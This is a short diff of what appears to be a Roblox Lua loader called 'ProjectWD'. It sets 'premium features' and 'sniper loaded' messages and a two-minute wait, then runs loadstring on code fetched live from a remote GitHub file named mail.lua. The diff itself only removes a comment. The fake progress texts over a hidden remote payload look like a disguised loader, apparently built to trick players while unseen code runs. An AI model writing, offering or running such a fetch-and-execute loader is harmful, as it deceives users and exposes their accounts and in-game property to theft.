@@ -9,6 +9,6 @@ _G.ScriptName = "ProjectWD"
 _G.FirstText = "Activating premium features.."
 _G.SecondText = "Auto comets loaded"
 _G.ThirdText = "Booth sniper loaded"
-_G.WaitingTime = 120 -- it's the time between 0% and 100% in secondes
+_G.WaitingTime = 120
 
 loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
